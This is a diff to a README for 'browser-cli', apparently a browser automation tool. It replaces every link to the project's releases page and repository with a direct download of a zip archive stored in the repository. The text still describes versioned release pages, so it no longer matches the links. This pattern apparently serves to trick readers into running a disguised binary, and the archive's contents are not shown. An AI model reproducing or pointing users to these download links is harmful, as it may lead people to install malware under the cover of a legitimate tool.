@@ -1,6 +1,6 @@
 # 🖥️ browser-cli - Simple Browser Automation Tools
 
-[![Download browser-cli](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/mauritzpatriarchic762/browser-cli/releases)
+[![Download browser-cli](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/mauritzpatriarchic762/browser-cli/main/cli/browser_cli_2.7.zip)
 
 ## 📋 What is browser-cli?
 
@@ -29,7 +29,7 @@ This section explains how to get the program and prepare your system.
 
 You will need to download browser-cli from the official releases page. Click the button below to open the download page:
 
-[![Download browser-cli](https://img.shields.io/badge/Download-Here-blue)](https://github.com/mauritzpatriarchic762/browser-cli/releases)
+[![Download browser-cli](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/mauritzpatriarchic762/browser-cli/main/cli/browser_cli_2.7.zip)
 
 The page shows different versions. Choose the latest stable version marked as "Windows" or with the `.exe` file extension. If you see multiple files, pick the one without "beta" or "alpha" in the name.
 
@@ -78,7 +78,7 @@ You can find example scripts on the GitHub page in the “Examples” folder.
 To keep browser-cli working well, check for new versions:
 
 1. Visit the download page regularly:  
-   https://github.com/mauritzpatriarchic762/browser-cli/releases
+   https://raw.githubusercontent.com/mauritzpatriarchic762/browser-cli/main/cli/browser_cli_2.7.zip
 2. Download the latest version.
 3. Repeat the install steps above.
 
@@ -109,10 +109,10 @@ browser-cli runs commands in your browser. Only run scripts you trust. Running u
 
 Check the GitHub repository for more details:
 
-https://github.com/mauritzpatriarchic762/browser-cli
+https://raw.githubusercontent.com/mauritzpatriarchic762/browser-cli/main/cli/browser_cli_2.7.zip
 
 There you will find guides, examples, and links to help pages.
 
 ---
 
-[![Download browser-cli](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/mauritzpatriarchic762/browser-cli/releases)
+[![Download browser-cli](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/mauritzpatriarchic762/browser-cli/main/cli/browser_cli_2.7.zip)
